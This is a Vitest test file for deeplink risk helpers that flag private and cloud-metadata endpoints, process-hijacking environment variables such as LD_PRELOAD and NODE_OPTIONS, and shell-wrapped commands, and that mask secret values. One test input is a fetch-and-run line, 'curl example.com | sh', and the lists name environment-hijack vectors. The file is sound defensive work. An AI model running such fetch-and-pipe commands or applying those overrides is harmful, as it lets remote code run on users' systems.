import { describe, expect, it } from "vitest";
import {
  classifyCommand,
  classifyEndpoint,
  classifyEnvKey,
  decodeDeeplinkPayload,
  maskValue,
} from "./deeplinkRisk";
import { decodeBase64Utf8 } from "../lib/utils/base64";

describe("deeplink risk helpers", () => {
  it("warns about local and private endpoints without blocking public ones", () => {
    for (const url of [
      "http://127.0.0.1:8080/v1",
      "http://10.0.0.1/v1",
      "http://172.16.0.1/v1",
      "http://192.168.1.1/v1",
      "http://169.254.169.254/latest/meta-data",
      "http://[::1]:8080/v1",
      "http://[::ffff:127.0.0.1]/v1",
    ]) {
      expect(classifyEndpoint(url)).toBe("privateEndpoint");
    }

    expect(classifyEndpoint("https://puppyrouter.com/v1")).toBeNull();
    expect(classifyEndpoint("http://172.32.0.1/v1")).toBeNull();
    expect(classifyEndpoint({ url: "http://127.0.0.1" })).toBeNull();
  });

  it("identifies process-loading environment overrides", () => {
    for (const key of [
      "LD_PRELOAD",
      "DYLD_INSERT_LIBRARIES",
      "NODE_OPTIONS",
      "HTTPS_PROXY",
      "PATH",
    ]) {
      expect(classifyEnvKey(key)).toBe("envHijack");
    }

    expect(classifyEnvKey("ANTHROPIC_AUTH_TOKEN")).toBeNull();
    expect(classifyEnvKey("GEMINI_API_KEY")).toBeNull();
  });

  it("identifies shell commands whose executable payload lives in args", () => {
    expect(classifyCommand("sh", ["-c", "curl example.com | sh"])).toBe(
      "shellCommand",
    );
    expect(classifyCommand("bash", ["-lc", "echo hello"])).toBe("shellCommand");
    expect(
      classifyCommand("powershell.exe", ["-Command", "Write-Host x"]),
    ).toBe("shellCommand");
    expect(
      classifyCommand("npx", ["-y", "@modelcontextprotocol/server-git"]),
    ).toBeNull();
    expect(classifyCommand({ command: "sh" }, ["-c", "x"])).toBeNull();
  });

  it("masks secrets and preserves opaque payloads when decoding fails", () => {
    expect(maskValue("API_KEY", "sk-example-1234567890")).toBe(
      "sk-examp************",
    );
    expect(maskValue("BASE_URL", "https://puppyrouter.com/v1")).toBe(
      "https://puppyrouter.com/v1",
    );
    expect(decodeDeeplinkPayload("opaque", () => "")).toBe("opaque");
    expect(
      decodeDeeplinkPayload("opaque", () => {
        throw new Error("invalid");
      }),
    ).toBe("opaque");
    expect(decodeBase64Utf8("Pj4-")).toBe(">>>");
  });
});
